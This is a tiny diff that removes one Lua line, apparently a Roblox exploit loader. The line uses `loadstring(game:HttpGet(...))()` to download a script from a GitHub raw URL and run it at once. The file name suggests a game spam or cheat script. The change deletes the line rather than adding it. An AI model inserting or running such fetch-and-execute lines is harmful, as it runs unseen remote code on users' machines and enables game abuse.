@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/don-t-get-fired-at-work-spam6-5k1co5swo169wv.lua"))()
